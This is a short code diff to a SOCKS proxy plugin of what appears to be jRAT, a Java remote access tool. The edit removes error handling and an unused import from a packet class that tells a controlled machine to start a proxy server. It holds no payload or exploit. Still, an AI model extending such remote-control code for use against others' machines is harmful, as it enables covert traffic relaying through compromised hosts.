@@ -1,6 +1,5 @@
 package se.jrat.plugin.socks.client;
 
-import java.awt.Color;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 
@@ -17,6 +16,7 @@ public class Packet118Start extends PacketBuilder {
 	private String host;
 	private int port;
 	
+	@SuppressWarnings("unused")
 	private FrameSocks frame;
 
 	public Packet118Start(RATObject rat, boolean socks5, boolean auth, String user, String pass, String host, int port) {
@@ -37,14 +37,6 @@ public class Packet118Start extends PacketBuilder {
 		dos.writeBoolean(auth);
 		dos.writeUTF(user);
 		dos.writeUTF(pass);
-		
-		if (!dis.readBoolean()) {
-			String error = dis.readUTF();
-			if (frame != null) {
-				frame.setLabelColor(Color.red);
-				frame.setLabelText("Failed to start server: " + error);
-			}
-		}
 	}
 	
 	public void setFrame(FrameSocks frame) {
